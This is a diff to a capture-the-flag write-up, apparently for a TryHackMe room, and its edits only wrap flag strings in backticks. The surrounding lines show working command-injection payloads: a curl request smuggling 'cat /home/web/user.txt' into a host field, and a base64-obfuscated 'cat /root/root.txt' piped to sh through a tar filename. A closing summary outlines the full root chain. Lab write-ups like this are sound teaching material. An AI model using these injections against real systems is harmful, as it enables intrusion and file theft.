@@ -69,7 +69,7 @@ Reading the user flag
 curl -s -X POST http://10.48.171.223/internal/netcheck \
     --data-urlencode 'host=127.0.0.1;cat /home/web/user.txt'
 ```
-User flag: THM{n0_v1s1bl3_……………….._3dg3}
+User flag: `THM{n0_v1s1bl3_……………….._3dg3}`
 
 With a shell on the box i enumerated the listening services and this is where the room gets interesting. The command i used was
 ```
@@ -283,7 +283,7 @@ print(r.read().decode())
 Output:
 ```
 {"command":"tar czf /var/automation/exports/x;echo Y2F0IC9yb290L3Jvb3QudHh0|base64 -d|sh;echo.tgz /var/automation/data 2>&1",
- "output":"THM{tr4c3d_……………….._h0r1z0n}\n/bin/sh: 1: echo.tgz: not found\n..."}
+ "output":"`THM{tr4c3d_……………….._h0r1z0n}`\n/bin/sh: 1: echo.tgz: not found\n..."}
 ```
 
 And the box is pretty much done. The whole chain from a low privilege web shell to root: a command injection for the web shell, a FreePBX loopback admin authentication bypass to mint API tokens, the backup module as an arbitrary full database dump, the automation key hiding in a voicemail caller-id and a second command injection this time as root. Two command injections and a secrets management fail.
